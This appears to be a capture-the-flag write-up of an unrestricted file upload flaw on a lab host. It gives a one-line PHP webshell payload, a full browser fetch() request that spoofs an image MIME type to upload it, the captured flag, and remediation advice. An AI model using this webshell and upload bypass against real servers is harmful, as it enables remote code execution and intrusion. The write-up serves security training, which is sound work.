### 🛡️ Unrestricted File Upload

📝 **Description**
This vulnerability occurs when a web application allows users to upload files without properly validating their type, extension, or contents. By bypassing weak server-side filters, an attacker can upload a malicious script (like a PHP webshell) to execute arbitrary code on the server.

🕵️‍♂️ **Exploitation Process**

1. **Discovery**
   - Investigated the "upload picture" feature on `192.168.64.2`.
   - Initial tests showed the server blocked `.php` and `.py` extensions, only allowing `.jpeg`.

2. **Bypassing via Console Fetch (MIME-Type Spoofing)**
   - I intercepted the original request and recreated it using a `fetch` command in the browser console.
   - I manually set the `Content-Type` for the file part of the multipart body to `image/jpeg` while keeping the filename as `webshell.php`.
   - **Payload used:** `<?php echo system($_GET['cmd']); ?>`

3. **Execution Command**
   **JavaScript**

   ```
   fetch("http://192.168.64.2/?page=upload", {
     "method": "POST",
     "headers": {
       "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryprsTSsDXPgHrFn7q"
     },
     "body": "------WebKitFormBoundaryprsTSsDXPgHrFn7q\r\nContent-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n\r\n100000\r\n------WebKitFormBoundaryprsTSsDXPgHrFn7q\r\nContent-Disposition: form-data; name=\"uploaded\"; filename=\"webshell.php\"\r\nContent-Type: image/jpeg\r\n\r\n<?php echo system($_GET['cmd']); ?>\r\n------WebKitFormBoundaryprsTSsDXPgHrFn7q\r\nContent-Disposition: form-data; name=\"Upload\"\r\n\r\nUpload\r\n------WebKitFormBoundaryprsTSsDXPgHrFn7q--\r\n"
   }).then(response => response.text()).then(html => { document.open(); document.write(html); document.close(); });
   ```

4. **Result**
   - The server accepted the forged `image/jpeg` MIME-type.
   - The file was uploaded to `/tmp/webshell.php`.
   - **Flag Found:** `46910D9CE35B385885A9F7E2B336249D622F29B267A1771FBACF52133BEDDBA8`

🛠️ **How to Fix**

- **File Content Validation:** Use "magic bytes" to verify the actual file signature rather than trusting the `Content-Type` header.
- **Filename Sanitization:** Remove control characters (like Null Bytes `%00`) and special characters from filenames.
- **Non-Executable Storage:** Store uploaded files in a directory with execution permissions disabled (`no-exec`).
- **Randomized Renaming:** Rename files upon upload to prevent direct access to the script via a predictable URL.
